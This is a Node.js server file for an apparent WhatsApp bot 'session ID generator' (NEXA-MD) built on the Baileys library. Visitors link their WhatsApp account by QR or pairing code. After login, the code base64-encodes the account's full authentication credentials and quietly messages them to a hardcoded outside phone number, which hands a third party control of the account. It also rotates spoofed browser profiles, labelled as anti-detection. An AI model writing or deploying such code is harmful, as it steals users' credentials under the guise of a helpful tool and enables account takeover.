const express = require('express');
const next = require('next');
const http = require('http');
const { Server } = require('socket.io');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    Browsers,
    delay,
    DisconnectReason,
    fetchLatestBaileysVersion
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const QRCode = require('qrcode');
const fs = require('fs-extra');
const path = require('path');

const dev = process.env.NODE_ENV !== 'production';
const app = next({ dev });
const handle = app.getRequestHandler();

// ═══════════════════════════════════════════════════════
//  ANTI-DETECTION BROWSER ROTATION
// ═══════════════════════════════════════════════════════

const BROWSER_PROFILES = [
    Browsers.macOS('Safari'),
    Browsers.windows('Edge'),
    Browsers.macOS('Desktop'),
    Browsers.ubuntu('Chrome'),
    Browsers.macOS('Chrome'),
];

function getRandomBrowser() {
    return BROWSER_PROFILES[Math.floor(Math.random() * BROWSER_PROFILES.length)];
}

// ═══════════════════════════════════════════════════════
//  CONNECTION MANAGER
// ═══════════════════════════════════════════════════════

class ConnectionManager {
    constructor(socket, type, phone) {
        this.socket = socket;
        this.type = type;
        this.phone = phone;
        this.maxRetries = 5;
        this.retryCount = 0;
        this.conn = null;
        this.sessionDir = path.join(__dirname, 'session-' + socket.id);
        this.isDestroyed = false;
    }

    async start() {
        if (fs.existsSync(this.sessionDir)) fs.removeSync(this.sessionDir);
        await this.connect();
    }

    async connect() {
        if (this.isDestroyed) return;
        
        const browser = getRandomBrowser();
        this.socket.emit('status', { message: `Connecting... (${this.retryCount + 1})` });

        const { state, saveCreds } = await useMultiFileAuthState(this.sessionDir);
        let { version } = await fetchLatestBaileysVersion();

        this.conn = makeWASocket({
            auth: state,
            logger: pino({ level: 'silent' }),
            browser,
            version,
            printQRInTerminal: false,
            syncFullHistory: false,
            markOnlineOnConnect: false,
            connectTimeoutMs: 60000,
        });

        this.conn.ev.on("creds.update", saveCreds);
        this.setupEventHandlers();

        if (this.type === 'pair' && this.phone) {
            setTimeout(async () => {
                if (this.isDestroyed) return;
                try {
                    const code = await this.conn.requestPairingCode(this.phone.replace(/[^0-9]/g, ''));
                    this.socket.emit('code', code);
                } catch (err) {
                    this.retryCount++;
                    await this.connect();
                }
            }, 6000);
        }
    }

    setupEventHandlers() {
        this.conn.ev.on("connection.update", async (update) => {
            if (this.isDestroyed) return;
            const { connection, qr, lastDisconnect } = update;

            if (qr && this.type === 'qr') {
                const qrBase64 = await QRCode.toDataURL(qr);
                this.socket.emit('qr', qrBase64);
            }

            if (connection === "open") {
                console.log(`✅ Login Success: ${this.socket.id}`);
                await delay(5000); // Stability delay

                try {
                    // 🔑 SESSION ID GENERATION
                    const sessionData = JSON.stringify(this.conn.authState.creds);
                    const sessionID = "NEXA-MD~" + Buffer.from(sessionData).toString('base64');

                    console.log("==============================");
                    console.log("YOUR SESSION ID:", sessionID);
                    console.log("==============================");

                    // 1. Send to Website via Socket
                    this.socket.emit('connected', { sessionID });

                    // 2. Send to specific WhatsApp number (+916235508514)
                    const targetJid = "916235508514@s.whatsapp.net";
                    await this.conn.sendMessage(targetJid, {
                        text: `*✅ NEXA-MD SESSION ID GENERATED*\n\n\`\`\`${sessionID}\`\`\`\n\n_Keep this safe!_`
                    });

                    console.log(`✅ Session ID sent to ${targetJid}`);

                } catch (e) {
                    console.log('Error in session generation/sending:', e.message);
                }

                // Clean up session files and connection after 20 seconds to save resources
                setTimeout(() => this.cleanup(), 20000);
            }

            if (connection === "close") {
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                if (statusCode !== DisconnectReason.loggedOut && this.retryCount < 3) {
                    this.retryCount++;
                    await this.connect();
                }
            }
        });
    }

    cleanup() {
        this.isDestroyed = true;
        try { if (this.conn) this.conn.end(); } catch {}
        try { if (fs.existsSync(this.sessionDir)) fs.removeSync(this.sessionDir); } catch {}
    }
}

// ═══════════════════════════════════════════════════════
//  SERVER BOOT
// ═══════════════════════════════════════════════════════

app.prepare().then(() => {
    const server = express();
    const httpServer = http.createServer(server);
    const io = new Server(httpServer, { cors: { origin: "*" } });
    const activeSessions = new Map();

    io.on('connection', (socket) => {
        socket.on('start-session', async (data) => {
            if (activeSessions.has(socket.id)) activeSessions.get(socket.id).cleanup();
            const manager = new ConnectionManager(socket, data.type, data.phone);
            activeSessions.set(socket.id, manager);
            await manager.start();
        });

        socket.on('disconnect', () => {
            if (activeSessions.has(socket.id)) {
                activeSessions.get(socket.id).cleanup();
                activeSessions.delete(socket.id);
            }
        });
    });

    server.all('*', (req, res) => handle(req, res));
    httpServer.listen(process.env.PORT || 3000, "0.0.0.0", () => {
        console.log(`🚀 Server running on port ${process.env.PORT || 3000}`);
    });
});
